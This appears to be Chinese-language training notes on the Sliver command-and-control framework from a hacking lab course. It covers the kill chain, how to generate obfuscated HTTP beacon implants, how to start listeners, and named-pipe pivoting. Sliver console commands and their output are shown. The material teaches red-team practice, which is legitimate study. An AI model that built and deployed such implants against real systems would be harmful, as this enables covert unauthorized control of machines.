C2 伺服器是一種用於在遠端電腦或網路上執行指令或二進位檔案的軟體。C2 的主要功能是提供一個集中管理系統,讓操作者(紅隊成員)可以管理對網路中其他機器的存取權限。

**攻擊生命週期 (Cyber Kill Chain)**:

根據 Lockheed Martin 在 2011 年提出的框架,網路攻擊生命週期分為七個階段:

|階段|說明|
|---|---|
|偵察 (Reconnaissance)|收集目標資訊,可以是主動或被動偵察|
|武器化 (Weaponization)|開發可建立立足點的有效載荷(payload)|
|投放 (Delivery)|找到將有效載荷傳輸到目標的方法|
|利用 (Exploitation)|在目標上執行有效載荷|
|安裝 (Installation)|在目標上建立初始控制|
|C2 通訊|從目標建立到 C2 伺服器的連線|
|達成目標 (Actions on Objectives)|執行預期目標,如資料竊取或外洩|

## Sliver 簡介

**Sliver** 是由 BishopFox 開發的開源 C2 框架,其客戶端、伺服器和植入物(beacons/implants)都使用 Golang 編寫,使其易於跨平台編譯。

### Sliver 的核心概念

- **Implants (植入物)**: 用於在目標系統上保持存取的可執行程式
- **Beacons (信標)**: 以固定時間間隔與 C2 伺服器通訊的模式,適合規避偵測
- **Sessions (會話)**: 即時互動模式,指令會立即執行
- **Stagers (分階段載入器)**: 用於載入程式碼到遠端機器的小型程式

## 植入物 (Implants)

[植入物 (Implants)](https://sliver.sh/docs?name=Getting+Started) 是`指揮與控制 (command and control)` 伺服器運作中不可或缺的一部分。它們提供基於不同協定集的網路連線，以及 C2 伺服器與目標工作站/伺服器之間的通訊方式。Sliver 提供了為 Windows、Linux 和 MacOS 系統產生植入物的方法。`Implants` 可以在 `beacon` (信標) 和 `session` (會話) 模式下運作。`beacon` 模式會以間隔方式運作，導致指令在設定的時間段內執行。`session` 模式讓操作員能夠立即執行指令。在實際的`紅隊演練 (red team engagement)` 中，`beacon` 模式有其優點，因為它不會以恆定的速率傳輸流量/指令，這可能會驚動`藍隊 (blue team)`。值得注意的是，`beacons` 可以升級為 `sessions`。

#### 在 beacon 模式下產生植入物(Implants)

要在 `beacon` 模式下產生植入物，我們可以使用 `generate` 指令，後面接著 `beacon`，同時根據支援的眾多選項進行選擇。
```
sliver > generate beacon --help
Generate a beacon binary Usage: ====== 
beacon [flags] 
Flags: ====== 
-a, --arch string cpu architecture (default: amd64) 
-c, --canary string canary domain(s) 
-D, --days int beacon interval days (default: 0) 
-d, --debug enable debug features 
-O, --debug-file string path to debug output 
-G, --disable-sgn disable shikata ga nai shellcode encoder 
-n, --dns string dns connection strings 
-e, --evasion enable evasion features (e.g. overwrite user space hooks) 
-E, --external-builder use an external builder 
-f, --format string Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe) 
<SNIP>
```
`beacon` 模式的植入物可以使用 `Sliver` 中可用的協定來產生——mTLS、HTTP(s)、DNS、`具名管道 (named pipes)` 和 tcp pivots；後者主要用於在環境中的內部目標之間進行`橫向移動 (pivoting)`。以下是產生 HTTP `beacon` 的兩種變體，同時比較`未混淆 (non-obfuscated)` 植入物 (`--skip-symbols`) 與`混淆 (obfuscated)` 植入物之間的大小。為求簡便，產生的二進位檔名稱並未隨機化，而這正是 `Sliver` 的預設行為。
```
sliver > generate beacon --http 127.0.0.1 --skip-symbols -N http_beacon --os windows
[*] Generating new windows/amd64 beacon implant binary (1m0s) [!] Symbol obfuscation is disabled 
[*] Build completed in 2s 
[*] Implant saved to /home/htb-ac-8414/http_beacon.exe
```
**重要**: Beacon 模式是非即時的，指令會在下次回連時執行。如果需要即時互動可以升級為 session。

在 beacon 模式下產生一個混淆的植入物
```
sliver > generate beacon --http 127.0.0.1 -N http_beacon_obfuscated --os windows
[*] Generating new windows/amd64 beacon implant binary (1m0s) 
[*] Symbol obfuscation is enabled 
[*] Build completed in 19s 
[*] Implant saved to /home/htb-ac-8414/http_beacon_obfuscated.exe
```
## 接聽器 (Listeners)
[接聽器 (Listeners)](https://sliver.sh/docs?name=Getting+Started) 是一個關鍵步驟，因為接聽器提供了將植入物連接到 C2 伺服器的能力。如果沒有接聽器，即使我們產生了一個植入物並將其傳送到目標，也無法獲得 `beacon` 或 `session`。我們可以在 `Sliver` 中啟動一個接聽器，其協定基於我們產生植入物二進位檔時所選擇的協定。

如果我們在主控台中使用 `http` 指令產生了一個 HTTP(s) beacon。
>**注意**：Academy 中提供的工作站將埠 80 用於另一個重要的程序；因此，使用了 `--lport`。透過 `jobs` 指令，我們可以得知目前設定的接聽器；預設情況下，`Sliver` 在埠 `31337` 上運作，不應停止該接聽器。

```
sliver > http --lport 8088
[*] Starting HTTP :8088 listener ...
[*] Successfully started job #2

sliver > jobs
ID   Name   Protocol   Port    Stage Profile 
==== ====== ========== ======= ===============
 1    grpc   tcp        31337                 
 2    http   tcp        8088 
```

#### 具名管道 (Named pipes)
[具名管道 (Named pipe)](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipes) 是一個用於在伺服器和用戶端之間建立通訊的概念；這可以是電腦 A 上的一個程序和電腦 B 上的一個程序。每個管道都有一個唯一的名稱，遵循 `\\ServerName\pipe\PipeName` 或 `\\.\pipe\PipeName` 的格式。在大多數情況下，您的任務之一就是盡可能地融入環境。在 Windows 系統上，可以透過 PowerShell 中的 `ls` 指令，後面接著 `\\.\pipe\` 目錄來列舉具名管道。
```
PS C:\Users\htb-student> ls \\.\pipe\ 
Directory: \\.\pipe 
Mode LastWriteTime Length Name 
---- ------------- ------ ---- 
------ 01.1.1601 y. 02:00 3 InitShutdown 
------ 01.1.1601 y. 02:00 5 lsass 
------ 01.1.1601 y. 02:00 3 ntsvcs
```
在 `Sliver` 中，具名管道主要用於在 Windows 上進行橫向移動 (pivoting)，因為在撰寫本文時，這是唯一支援的作業系統。產生一個 `pivot` 接聽器遵循不同的方法，需要在目標上建立一個已建立的 `session`。`pivot` 接聽器類似於`綁定殼層 (bind shell)`；我們在主機 A 上啟動一個 `pivot` 接聽器，然後從主機 B 連接到主機 A，從而在兩台主機之間建立一條通訊鏈。這種方法用於流量路由受到嚴格限制的環境中。